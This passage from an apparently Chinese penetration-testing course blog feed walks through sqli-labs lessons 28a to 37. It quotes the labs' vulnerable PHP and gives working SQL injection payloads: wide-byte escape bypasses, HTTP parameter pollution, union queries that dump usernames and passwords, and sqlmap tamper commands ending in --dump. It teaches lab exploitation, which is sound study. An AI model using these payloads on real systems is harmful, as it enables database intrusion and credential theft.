<span class="token operator">|</span> secure   <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">5</span>  <span class="token operator">|</span> stupidity  <span class="token operator">|</span> stupid   <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">6</span>  <span class="token operator">|</span> genious    <span class="token operator">|</span> superman <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">7</span>  <span class="token operator">|</span> mob<span class="token operator">!</span>le     <span class="token operator">|</span> batman   <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">8</span>  <span class="token operator">|</span> admin      <span class="token operator">|</span> admin    <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">9</span>  <span class="token operator">|</span> admin1     <span class="token operator">|</span> admin1   <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">10</span> <span class="token operator">|</span> admin2     <span class="token operator">|</span> admin2   <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">11</span> <span class="token operator">|</span> admin3     <span class="token operator">|</span> admin3   <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">12</span> <span class="token operator">|</span> dumbo      <span class="token operator">|</span> dhakkan  <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">14</span> <span class="token operator">|</span> admin4     <span class="token operator">|</span> admin4   <span class="token operator">|</span>+----+------------+----------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less37</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less32/less36/less37/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less32/less36/less37/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$uname</span> <span class="token operator">=</span> mysql_real_escape_string<span class="token punctuation">(</span><span class="token variable">$uname1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$passwd</span><span class="token operator">=</span> mysql_real_escape_string<span class="token punctuation">(</span><span class="token variable">$passwd1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>mysql_query<span class="token punctuation">(</span><span class="token string">"SET NAMES gbk"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT username, password FROM users WHERE username='<span class="token variable">$uname</span>' and password='<span class="token variable">$passwd</span>' LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>mysql_real_escape_string</p></blockquote><p>post型的宽字节注入 <a name="gLILH"></a></p><h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><p><a name="izUqu"></a></p><h2 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h2><p><code>uname=**汉'** order by 3--+  </code><br>2个字段 <a name="B0iQ5"></a></p><h2 id="回显点检查"><a href="#回显点检查" class="headerlink" title="回显点检查"></a>回显点检查</h2><p><code>uname=汉' union select 1,2--+</code> <a name="kzUVz"></a></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>主要看用户,数据库版本&amp;#x20;<br><code>uname=汉' union select user(),version()--+</code>\ <a name="kzVJM"></a></p><h2 id="开始注入"><a href="#开始注入" class="headerlink" title="开始注入"></a>开始注入</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">爆破数据库名称<span class="token assign-left variable">uname</span><span class="token operator">=</span>汉<span class="token string">' union select 1,database()--+爆破数据库表名称uname=汉'</span> union <span class="token keyword">select</span> <span class="token number">1</span>,group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span>from information_schema.tables where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span>--+爆破字段名称users的16进制是0x7573657273<span class="token assign-left variable">uname</span><span class="token operator">=</span>汉<span class="token string">' union select 1,group_concat(column_name)from information_schema.columns where table_schema=database() and table_name=0x7573657273--+爆破字段内容uname=汉'</span> union <span class="token keyword">select</span> <span class="token number">1</span>,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>username,0x7e,password<span class="token punctuation">)</span> from <span class="token function">users</span><span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less35</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less32/less33/less35/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less32/less33/less35/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token keyword">function</span> check_addslashes<span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$string</span> <span class="token operator">=</span> addslashes<span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token builtin class-name">return</span> <span class="token variable">$string</span><span class="token punctuation">;</span><span class="token punctuation">}</span>mysql_query<span class="token punctuation">(</span><span class="token string">"SET NAMES gbk"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id=<span class="token variable">$id</span> LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>get,数字型注入</strong>。</p><p><code>?id=1 and 1=1--+</code>返回正常<br><code>?id=1 and 1=2--+</code>没有报错回显</p><p><code>?id=1 order by 4--+</code>没有第4列<br><code>?id=1 order by 3--+</code>返回正常<br>3个字段</p><p>数字型注入唯一需要注意的是<br>在查询字段时，<strong>数据表名使用十六进制</strong>即可，其他地方没有转义 。 <a name="RN6n1"></a></p><h1 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">爆破数据库名称 ?id<span class="token operator">=</span>-1 union <span class="token keyword">select</span> <span class="token number">1,2</span>,database<span class="token punctuation">(</span><span class="token punctuation">)</span>--+爆破数据库表名称?id<span class="token operator">=</span>-1 union <span class="token keyword">select</span> <span class="token number">1,2</span>,group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span>from information_schema.tables where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span>--+爆破字段名称爆破字段的时候需要将数据表的名字进行十六进制编码，防止转义  users的16进制是0x7573657273?id<span class="token operator">=</span>-1 union <span class="token keyword">select</span> <span class="token number">1,2</span>,group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span>from information_schema.columns where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> and <span class="token assign-left variable">table_name</span><span class="token operator">=</span>0x7573657273--+爆破字段内容?id<span class="token operator">=</span>-1 union <span class="token keyword">select</span> <span class="token number">1,2</span>,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>username,0x7e,password<span class="token punctuation">)</span> from <span class="token function">users</span><span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less34</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less32/less33/less34/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less32/less33/less34/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$uname</span> <span class="token operator">=</span> addslashes<span class="token punctuation">(</span><span class="token variable">$uname1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$passwd</span><span class="token operator">=</span> addslashes<span class="token punctuation">(</span><span class="token variable">$passwd1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>mysql_query<span class="token punctuation">(</span><span class="token string">"SET NAMES gbk"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT username, password FROM users WHERE username='<span class="token variable">$uname</span>' and password='<span class="token variable">$passwd</span>' LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>post型宽字节注入 ，单引号’闭合</p><p><code>admin' or 1=1-++</code></p><blockquote><p>Hint: The Username you input is escaped as : admin’ or 1=1-++<br>Hint: The Password you input is escaped as :</p></blockquote><p>在登录框尝试字符登录发现有转义&amp;#x20;<br>&amp;#x20;因为是post提交不能使用url编码，<br>但是可以<strong>使用十六进制编码绕过</strong>，但是需要使用三个字节，<br>最好的 办法是是<strong>使用汉字</strong>(一些汉字是三个字节的就可以将后面的\消耗) <a name="rJWqQ"></a></p><h1 id="post型宽字节注入"><a href="#post型宽字节注入" class="headerlink" title="post型宽字节注入"></a>post型宽字节注入</h1><p><a name="oaebC"></a></p><h2 id="爆破数据库名称"><a href="#爆破数据库名称" class="headerlink" title="爆破数据库名称"></a>爆破数据库名称</h2><p><code>**uname=汉'** union select 1,database()--+</code> <a name="ABEKW"></a></p><h2 id="爆破数据库表名称"><a href="#爆破数据库表名称" class="headerlink" title="爆破数据库表名称"></a>爆破数据库表名称</h2><p><code>**uname=汉'** union select 1,group_concat(table_name)from information_schema.tables where table_schema=database()--+</code> <a name="ihxEF"></a></p><h2 id="爆破字段名称"><a href="#爆破字段名称" class="headerlink" title="爆破字段名称"></a>爆破字段名称</h2><p>爆破字段的时候<strong>需要将数据表的名字</strong>进行十六进制编码，防止转义 &amp;#x20;<br>users的16进制是0x7573657273</p><p><code>**uname=汉'** union select 1,group_concat(column_name)from information_schema.columns where table_schema=database() and table_name=0x7573657273--+</code> <a name="K0Bi6"></a></p><h2 id="爆破字段内容"><a href="#爆破字段内容" class="headerlink" title="爆破字段内容"></a>爆破字段内容</h2><p><code>**uname=汉'** union select 1,(select group_concat(username,0x7e,password) from users)--+</code></p><p><a name="eRAU0"></a></p><h1 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h1><blockquote><p><strong>–tamper=”unmagicquotes.py”宽字节注入</strong></p></blockquote><p><a name="Eou5c"></a></p><h2 id="注入点检查"><a href="#注入点检查" class="headerlink" title="注入点检查"></a>注入点检查</h2><p><code>sqlmap -u http://192.168.31.193/Less-34/ --data="passwd=admin&amp;uname=admin" --batch --tamper="unmagicquotes.py"</code> <a name="FwuSB"></a></p><h2 id="爆破数据库名称-1"><a href="#爆破数据库名称-1" class="headerlink" title="爆破数据库名称"></a>爆破数据库名称</h2><p><code>sqlmap -u http://192.168.31.193/Less-34/ --data="passwd=admin&amp;uname=admin" --batch --tamper="unmagicquotes.py"  --current-db</code> <a name="cWP4j"></a></p><h2 id="爆破数据表名称"><a href="#爆破数据表名称" class="headerlink" title="爆破数据表名称"></a>爆破数据表名称</h2><p><code>sqlmap -u http://192.168.31.193/Less-34/ --data="passwd=admin&amp;uname=admin" --batch --tamper="unmagicquotes.py"  -D "security" --tables</code> <a name="HBofh"></a></p><h2 id="爆破字段名称-1"><a href="#爆破字段名称-1" class="headerlink" title="爆破字段名称"></a>爆破字段名称</h2><p><code>sqlmap -u http://192.168.31.193/Less-34/ --data="passwd=admin&amp;uname=admin" --batch --tamper="unmagicquotes.py" -D "security" -T "users" --columns</code> <a name="YOLQ5"></a></p><h2 id="脱库"><a href="#脱库" class="headerlink" title="脱库"></a>脱库</h2><p><code>sqlmap -u http://192.168.31.193/Less-34/ --data="passwd=admin&amp;uname=admin" --batch --tamper="unmagicquotes.py" -D "security" -T "users" --dump</code></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less36</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less32/less36/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less32/less36/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token keyword">function</span> check_quotes<span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$string</span><span class="token operator">=</span> mysql_real_escape_string<span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token builtin class-name">return</span> <span class="token variable">$string</span><span class="token punctuation">;</span><span class="token punctuation">}</span>mysql_query<span class="token punctuation">(</span><span class="token string">"SET NAMES gbk"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id='<span class="token variable">$id</span>' LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面的check_quotes()函数是利用了mysql_real_escape_string()函数进行的过滤。<br><strong>mysql_real_escape_string()函数</strong>转义 SQL 语句中使用的字符串中的特殊字符。<br>下列字符受影响：</p><ul><li><strong>\x00</strong></li><li><strong>\n</strong></li><li><strong>\r</strong></li><li><hr></li><li><strong>‘</strong></li><li><strong>“</strong></li><li><strong>\x1a</strong></li></ul><p>通过页面回显发现依旧是<strong>宽字节注入</strong>\ <a name="JU3F6"></a></p><h1 id="注入点检查"><a href="#注入点检查" class="headerlink" title="注入点检查"></a>注入点检查</h1><p><code>?id=1'</code></p><blockquote><p>Hint: The Query String you input is escaped as : 1’<br>The Query String you input in Hex becomes : 315c27<br>十六进制</p></blockquote><p>单引号被转义，利用**%df**突破</p><p><a name="jqyPJ"></a></p><h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><p><a name="izUqu"></a></p><h2 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h2><p><code>?id=1%df' order by 4--+  </code> <a name="B0iQ5"></a></p><h2 id="回显点检查"><a href="#回显点检查" class="headerlink" title="回显点检查"></a>回显点检查</h2><p><code>?id=-1%df' union select 1,2,3--+</code> <a name="kzUVz"></a></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>主要看用户,数据库版本 ,<br><code>?id=1 %df' and 1=2 union select 1,user(),version()--+</code>\ <a name="kzVJM"></a></p><h2 id="开始注入"><a href="#开始注入" class="headerlink" title="开始注入"></a>开始注入</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">爆破数据库名称?id<span class="token operator">=</span>-1%df<span class="token string">' union select 1,2,database()--+爆破数据库表名称?id=-1%df'</span> union <span class="token keyword">select</span> <span class="token number">1,2</span>,group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span>from information_schema.tables where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span>--+爆破字段名称users的16进制是0x7573657273?id<span class="token operator">=</span>-1%df<span class="token string">' union select 1,2,group_concat(column_name)from information_schema.columns where table_schema=database() and table_name=0x7573657273--+爆破字段内容?id=-1%df'</span> union <span class="token keyword">select</span> <span class="token number">1,2</span>,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>username,0x7e,password<span class="token punctuation">)</span> from <span class="token function">users</span><span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less33</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less32/less33/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less32/less33/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token keyword">function</span> check_addslashes<span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$string</span><span class="token operator">=</span> addslashes<span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token builtin class-name">return</span> <span class="token variable">$string</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id='<span class="token variable">$id</span>' LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Less33通关方式与Less32一模一样<br>区别在于后台在Less33使用了**addslashes()**这个函数对字符串进行转义，<br>Less32手动添加过滤转义 <a name="EkWN2"></a></p><h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">检查注入点<span class="token number">1</span><span class="token string">'单引号被转义了。?id=1%df'</span> and <span class="token assign-left variable">1</span><span class="token operator">=</span><span class="token number">1</span>--+判断字段数 ?id<span class="token operator">=</span><span class="token number">1</span>%df<span class="token string">' and 1=1 order by 4--+ ?id=1%df'</span> and <span class="token assign-left variable">1</span><span class="token operator">=</span><span class="token number">1</span> order by <span class="token number">3</span>--+ 正常回显，有3列找回显点?id<span class="token operator">=</span><span class="token number">1</span>%df<span class="token string">' and 1=2 union select 1,2,3--+  显示2，3是回显点爆破数据库名称?id=1%df'</span> and <span class="token assign-left variable">1</span><span class="token operator">=</span><span class="token number">2</span> union <span class="token keyword">select</span> <span class="token number">1,2</span>,database<span class="token punctuation">(</span><span class="token punctuation">)</span>--+爆破数据库表名称?id<span class="token operator">=</span><span class="token number">1</span>%df<span class="token string">' and 1=2 union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()--+爆破字段名称users的16进制是0x7573657273?id=1%df'</span> and <span class="token assign-left variable">1</span><span class="token operator">=</span><span class="token number">2</span> union <span class="token keyword">select</span> <span class="token number">1,2</span>,group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span>from information_schema.columns where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> and <span class="token assign-left variable">table_name</span><span class="token operator">=</span>0x7573657273--+爆破字段内容?id<span class="token operator">=</span><span class="token number">1</span>%df' and <span class="token assign-left variable">1</span><span class="token operator">=</span><span class="token number">2</span> union <span class="token keyword">select</span> <span class="token number">1,2</span>,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>username,0x7e,password<span class="token punctuation">)</span> from <span class="token function">users</span><span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less31</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less29/less31/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less29/less31/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token string">'"'</span><span class="token builtin class-name">.</span><span class="token variable">$id</span><span class="token builtin class-name">.</span><span class="token string">'"'</span><span class="token punctuation">;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id= (<span class="token variable">$id</span>) LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>与Less29的区别为闭合方式为**双引号加括号”)  **</p><p><code>?id=1&amp;id=0"</code></p><blockquote><p><strong>Warning</strong>: mysql_fetch_array() expects parameter 1 to be resource, boolean given in <strong>E:\phpstudy_pro\WWW\sql.com\Less-31\index.php</strong> on line <strong>33</strong><br>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘“0””) LIMIT 0,1’ at line 1</p></blockquote><p>使用括号加单引号闭合”)</p><p><code>?id=1&amp;id=0") union select 1,2,3--+</code><br>显示2，3是回显点</p><p><a name="ohpIT"></a></p><h1 id="HTTP参数污染"><a href="#HTTP参数污染" class="headerlink" title="HTTP参数污染"></a>HTTP参数污染</h1><p><a name="iQW9u"></a></p><h2 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h2><blockquote><p><strong>?id=1&amp;id=0”)</strong></p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">查看当前数据库名称?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">'&amp;id=0") union select 1,2,(select database()) --+查看数据表名称?id=1'</span><span class="token operator">&amp;</span><span class="token assign-left variable">id</span><span class="token operator">=</span><span class="token number">0</span><span class="token string">") union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database())--+爆破字段名称?id=1&amp;id=0"</span><span class="token punctuation">)</span> union <span class="token keyword">select</span> <span class="token number">1,2</span>,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span>from information_schema.columns where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> and <span class="token assign-left variable">table_name</span><span class="token operator">=</span><span class="token string">'users'</span><span class="token punctuation">)</span>--+爆破字段内容 ?id<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token assign-left variable">id</span><span class="token operator">=</span><span class="token number">0</span>"<span class="token punctuation">)</span> union <span class="token keyword">select</span> <span class="token number">1,2</span>,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>username,0x7e,password<span class="token punctuation">)</span>from security.users <span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less30</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less29/less30/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less29/less30/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token string">'"'</span> <span class="token builtin class-name">.</span><span class="token variable">$id</span><span class="token builtin class-name">.</span> <span class="token string">'"'</span><span class="token punctuation">;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id=<span class="token variable">$id</span> LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token string">'"'</span> <span class="token builtin class-name">.</span><span class="token variable">$id</span><span class="token builtin class-name">.</span> <span class="token string">'"'</span><span class="token punctuation">;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id=<span class="token variable">$id</span> LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>与Less29的区别为闭合方式为双引号”</p><blockquote><p>This Site Protected by Worlds Best WAF<br>本网站受世界最佳WAF保护</p></blockquote><p><code>?id=1&amp;id=1" and 1="1</code>闭合<br>双引号闭合</p><p><a name="ohpIT"></a></p><h1 id="HTTP参数污染"><a href="#HTTP参数污染" class="headerlink" title="HTTP参数污染"></a>HTTP参数污染</h1><p><a name="iQW9u"></a></p><h2 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h2><blockquote><p><strong>?id=1&amp;id=0”</strong></p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">查看当前数据库名称?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">'&amp;id=0" union select 1,2,(select database()) --+查看数据表名称?id=1'</span><span class="token operator">&amp;</span><span class="token assign-left variable">id</span><span class="token operator">=</span><span class="token number">0</span><span class="token string">" union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database())--+爆破字段名称?id=1&amp;id=0"</span> union <span class="token keyword">select</span> <span class="token number">1,2</span>,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span>from information_schema.columns where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> and <span class="token assign-left variable">table_name</span><span class="token operator">=</span><span class="token string">'users'</span><span class="token punctuation">)</span>--+爆破字段内容 ?id<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token assign-left variable">id</span><span class="token operator">=</span><span class="token number">0</span>" union <span class="token keyword">select</span> <span class="token number">1,2</span>,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>username,0x7e,password<span class="token punctuation">)</span>from security.users <span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less28a</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less28/less28a/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less28/less28a/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id=('<span class="token variable">$id</span>') LIMIT 0,1"</span><span class="token punctuation">;</span>//<span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/[\/*]/'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  //strip out /*//<span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/[--]/'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  //Strip out --.//<span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/[#]/'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  //Strip out <span class="token comment">#.</span>//<span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/[ +]/'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      //Strip out spaces.//<span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/select/m'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     //Strip out spaces.//<span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/[ +]/'</span>,<span class="token 